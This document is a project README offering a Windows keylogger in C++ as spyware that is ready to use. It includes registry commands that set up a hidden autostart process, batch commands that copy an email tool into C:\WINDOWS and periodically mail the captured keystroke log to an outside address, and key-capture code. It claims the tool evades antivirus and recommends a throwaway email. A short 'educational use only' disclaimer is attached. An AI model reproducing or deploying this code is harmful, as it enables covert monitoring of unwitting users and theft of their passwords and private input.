
<h1 align="center">
  <br>




                                             
                  ,ad8888ba,                       
                 d8"'    `"8b   aa         aa      
                d8'             88         88      
                88          aaaa88aaaa aaaa88aaaa  
                88          """"88"""" """"88""""  
                Y8,             88         88      
                 Y8a.    .a8P   ""         ""      
                  `"Y8888Y"'                       

                                   
                                  
                                  
                                  
                                  
                           
  <br>
  Remote Keylogger
  <br>
</h1>

<h4 align="center">A simple home made keylogger that send logs to your email
.</h4>


<p align="center">
  <a href="#key-features">Key Features</a> •
  <a href="#how-to-use">How To Use</a> •
  <a href="#credits">Credits</a> •
  <a href="#license">License</a>
</p>

![screenshot](https://www.nevis.net/hubfs/2020/blog/e143-keylogger.gif)

## Key Features

* Autostart on windows login
  - You need to bind the file or make a setup. Also you can create a ghost process.
* FUD not detected by antivirus software. 
* Create a .txt log file, easy to send.
* Log all keys, simbols, space and mouse click.
* Sent to you a copy of the log periodically to your email.



## How To Use

You can build the project using Visual Studio or DevC++ (free), then you need to insert additional tools in the same foldere of the .exe launcher file, or you can use the prebuild exe in the repository. Check out the code to change the file paths needed for some features

Mandatory: Edit the batch file!

With this code you can create windows register file for create an autostart ghost process on windows login. Change the path with your file name
```batch
Reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v prova /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v prova /t REG_SZ /d "C:\\lancio.exe\" /f

```

If you want you can change the directory 

```batch
@COPY blat.exe C:\WINDOWS\blat.exe
@COPY blat.dll C:\WINDOWS\blat.dll
@COPY blat.lib C:\WINDOWS\blat.lib

```

Insert your email server and email address, change the timeout if you want
```batch

@blat -install out.alice.it yourmail@alice.it
cls
@blat keylogs.txt -to yourmail@alice.it -try 2 -subject Keylog
timeout /t 15
@blat keylogs.txt -to yourmail@alice.it -try 2 -subject Keylog
timeout /t 600

```
You can change the log file name in the main file

```C++
void WriteToLog(LPCSTR text) {
 ofstream logfile;
 logfile.open("keylogs.txt", fstream::app);
 logfile << text;
 logfile.close();
}
```
Delete the case option if you don't need to track mouse click or space for example

```C++
bool KeyIsListed(int iKey) {
 switch (iKey)
 {
 case VK_SPACE:
  cout << " ";
  WriteToLog(" ");
  break;
 case VK_RETURN:
  cout << "/n";
  WriteToLog("/n");
  break;
 case VK_SHIFT:
  cout << " Shift ";
  WriteToLog(" Shift ");
  break;
 case VK_BACK:
  cout << "/b";
  WriteToLog("/b");
  break;
 case VK_RBUTTON:
  cout << " rclick ";
  WriteToLog(" rclick ");
  break;
 case VK_LBUTTON:
  cout << " lclick ";
  WriteToLog(" lclick ");
  break;
 default: return FALSE;
 }
```

> **Note**
> You can use temporany email too


## Credits

Russo Giovanni M.

Use it for educational or legal purposes only

## License

MIT

---

